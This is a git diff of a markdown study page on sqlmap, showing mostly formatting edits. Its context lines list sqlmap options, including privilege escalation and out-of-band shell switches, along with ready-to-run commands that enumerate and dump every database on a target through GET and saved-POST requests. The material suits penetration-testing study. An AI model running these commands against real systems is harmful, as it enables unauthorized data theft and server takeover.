@@ -1,16 +1,16 @@
 Sqlmap is an open source penetration testing tool developed by Bernardo Damele Assumpcao Guimaraes and Miroslav Stampar that automates the process of detecting and exploiting SQL injection flaws and taking over database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester, and a broad range of switches lasting from database fingerprinting, fetching data from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.
 Installing Sqlmap.
 
-# Commands
+## Commands
 
-|**Options**|**Description**|
-|---|---|
-|`-u URL`, `--url=URL`|Target URL (e.g., "[http://www.site.com/vuln.php?id=1](http://www.site.com/vuln.php?id=1)")|
-|`--data=DATA`|Data string to be sent through POST (e.g., "id=1")|
-|`--random-agent`|Use randomly selected HTTP User-Agent header value|
-|`-p TESTPARAMETER`|Testable parameter(s)|
-|`--level=LEVEL`|Level of tests to perform (1-5, default 1)|
-|`--risk=RISK`|Risk of tests to perform (1-3, default 1)|
+| **Options**           | **Description**                                                                             |
+| --------------------- | ------------------------------------------------------------------------------------------- |
+| `-u URL`, `--url=URL` | Target URL (e.g., "[http://www.site.com/vuln.php?id=1](http://www.site.com/vuln.php?id=1)") |
+| `--data=DATA`         | Data string to be sent through POST (e.g., "id=1")                                          |
+| `--random-agent`      | Use randomly selected HTTP User-Agent header value                                          |
+| `-p TESTPARAMETER`    | Testable parameter(s)                                                                       |
+| `--level=LEVEL`       | Level of tests to perform (1-5, default 1)                                                  |
+| `--risk=RISK`         | Risk of tests to perform (1-3, default 1)                                                   |
 
 ### **Enumeration** commands:
 These options can be used to enumerate the back-end database management system information, structure, and data contained in tables.
@@ -44,7 +44,7 @@ These options can be used to access the back-end database management system on t
 | `--priv-esc`     | Database process user privilege escalation             |
 | `--os-smbrelay`  | One-click prompt for an OOB shell, Meterpreter, or VNC |
 
-# UseCase
+### Example
 **Simple HTTP GET Based Test**  
 `sqlmap -u https://testsite.com/page.php?id=7 --dbs`  
 
@@ -55,7 +55,6 @@ First, we need to identify the vulnerable POST request and save it. In order to 
 
 You’ll notice in the request above, we have a POST parameter 'blood_group' which could a vulnerable parameter.
 
-SavedHTTPPOST request
 SavedHTTPPOST request
 ```shell-session
 nare@nare$ cat req.txt     #request output saved as a file
@@ -181,8 +180,11 @@ Or we can simply dump all the available databases and tables using the following
 `sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --dump-all` 
 `sqlmap -u https://testsite.com/page.php?id=7 -D blood --dump-all`  
 
-  
 **Using POST based Method**
 `sqlmap -r req.txt -D <database_name> --dump-all`  
 `sqlmap -r req.txt-p  -D <database_name> --dump-all`  
+
+
+# Challange
+
 
